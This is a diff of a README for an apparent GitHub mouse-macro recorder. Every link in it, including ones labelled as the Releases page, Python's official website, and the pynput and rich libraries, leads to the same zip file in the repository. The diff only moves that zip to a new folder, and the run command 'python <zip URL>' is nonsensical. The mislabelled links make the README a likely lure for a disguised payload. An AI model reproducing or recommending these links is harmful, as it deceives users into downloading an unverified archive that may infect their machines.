@@ -1,7 +1,7 @@
 # 🎯 macro-recorder - Effortlessly Record and Playback Mouse Actions
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip)](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip)
+[![Download](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **macro-recorder**! This lightweight tool allows you to easily record and playback mouse macros. Whether you want to automate repetitive tasks or improve your productivity, this app is designed for you. Follow the steps below to download and run it on your computer.
@@ -14,7 +14,7 @@ Welcome to **macro-recorder**! This lightweight tool allows you to easily record
 ## 📥 Download & Install
 To get started, you need to download the application. Visit the Releases page to find the latest version: 
 
-[Download from Releases Page](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip)
 
 1. Click the link above.
 2. Choose the latest version available (look for the `Latest Release` tag).
@@ -34,7 +34,7 @@ Once the download finishes, follow these steps to install and run the applicatio
    ```
 5. **Run the Application**: Now, you can run the application with this command:
    ```bash
-   python https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip
+   python https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip
    ```
 
 ## 🎤 How to Use the Application
@@ -59,7 +59,7 @@ After you launch the application, you will see a simple command-line interface. 
 ## 🔧 Troubleshooting
 If you face any issues while using **macro-recorder**, here are some common problems and solutions:
 
-- **Python Not Found**: Ensure you have Python installed and it is added to your system's PATH. You can download it from [Python's official website](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip).
+- **Python Not Found**: Ensure you have Python installed and it is added to your system's PATH. You can download it from [Python's official website](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip).
   
 - **Permission Errors**: If you get permission errors while recording macros, check your macOS privacy settings. Ensure Terminal has the rights to control your computer and access input devices.
 
@@ -76,7 +76,7 @@ Feel free to explore the community for help and tips.
 
 ## 🌟 Acknowledgments
 This project uses the following libraries and tools:
-- [pynput](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip): A library that allows controlling and monitoring input devices.
-- [rich](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/docs/recorder-macro-2.4.zip): A library for rich text and beautiful formatting in the terminal.
+- [pynput](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip): A library that allows controlling and monitoring input devices.
+- [rich](https://raw.githubusercontent.com/ziiyoung/macro-recorder/main/src/macro_recorder/observers/recorder-macro-v1.5.zip): A library for rich text and beautiful formatting in the terminal.
 
 Thank you for choosing **macro-recorder** to simplify your mouse automation tasks. Happy recording!
